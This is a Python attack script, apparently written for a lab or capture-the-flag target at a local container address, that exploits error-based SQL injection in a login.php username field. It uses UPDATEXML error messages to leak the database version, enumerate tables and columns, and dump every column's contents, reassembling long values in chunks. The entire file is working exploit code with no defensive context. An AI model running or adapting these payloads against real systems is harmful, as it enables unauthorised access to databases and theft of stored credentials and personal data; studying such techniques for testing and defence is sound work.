import requests as r
import re
import json 

## TECHNIQUE USED: ERROR BASED SQL INJECTION ON login.php 

url = "http://172.17.0.2/login.php"
delim = "XPATH syntax error: '~(.+)~'"
too_much_length = r"XPATH syntax error: '~(.+)\.\.\.'"

def get_version():
    payload = "'or UPDATEXML(rand(),CONCAT(CHAR(126),version(),CHAR(126)),null) -- a"
    response = r.post(url=url , data = {"username":payload, "password":"we"})
    
    return re.findall(pattern=delim, string=response.text)[0]

def get_tables(offset = 0, tables = []):      
    payload = f"'or UPDATEXML(rand(),CONCAT(CHAR(126),(SELECT table_name from information_schema.tables where table_schema LIKE database() limit 1 offset {offset}),CHAR(126)),null) -- a"
    response = r.post(url=url , data = {"username":payload, "password":"we"})
    offset = offset + 1
        
    if rr := re.findall(pattern=delim, string=response.text):
        tables.append(rr[0])
        get_tables(offset, tables)
    
    return tables


def get_columns(table, offset = 0, columns = []):
    payload = f"' or UPDATEXML(rand(),CONCAT(CHAR(126),(SELECT column_name from information_schema.columns where table_name LIKE '{table}' limit 1 offset {offset}),CHAR(126)),null) -- a"
    response = r.post(url=url , data = {"username":payload, "password":"we"})
    offset = offset + 1
            
    if rr := re.findall(pattern=delim, string=response.text):
        columns.append(rr[0])
        get_columns(table, offset, columns)
    
    return columns


def get_data(table, column, offset=0, content = []):
    payload = f"'or UPDATEXML(rand(),CONCAT(CHAR(126),(SELECT {column} from {table} limit 1 offset {offset}),CHAR(126)),null) -- a"
    response = r.post(url=url , data = {"username":payload, "password":"we"})
    offset = offset + 1
            
    if rr := re.findall(pattern=delim, string=response.text):
        content.append(rr[0])
        get_data(table, column, offset, content)
        
    if rr := re.search(pattern=too_much_length, string=response.text):
        cc = get_long_content(column=column, offset=offset-1, table=table)
        if cc != "":
            content.append(cc)
            get_data(table, column, offset, content)
    
    return content

def get_long_content(column, offset, table, start_index=1, accumulated=""):    
    batch_size = 28
    payload = (
        f"' OR UPDATEXML(rand(), CONCAT(CHAR(126),"
        f"(SELECT SUBSTR({column}, {start_index}, {batch_size}) FROM {table} LIMIT 1 OFFSET {offset}),"
        f"CHAR(126)), NULL) -- a"
    )
    response = r.post(url=url, data={"username": payload, "password": "we"})
    matches = re.findall(pattern=delim, string=response.text)

    if not matches:
        return accumulated

    chunk = matches[0]
    accumulated += chunk

    if len(chunk) < batch_size:
        return accumulated

    return get_long_content(
        column=column,
        offset=offset,
        table=table,
        start_index=start_index + len(accumulated) - len(chunk) + batch_size,
        accumulated=accumulated
    )    
    
print("Version " + get_version())
print("Tables " , tt := get_tables())

dd = {}
for table in tt:
    dd.update({table : get_columns(table=table, offset=0, columns=[])})
    
print("Table+columns " ,dd)

aa = {}
for k,v in dd.items():
    temp = {}
    for c in v:
        temp.update({c :get_data(table=k, offset=0, column=c, content=[])})
    aa.update({k : temp})
         
print()
print("Full dump")
print(json.dumps(aa, indent=5))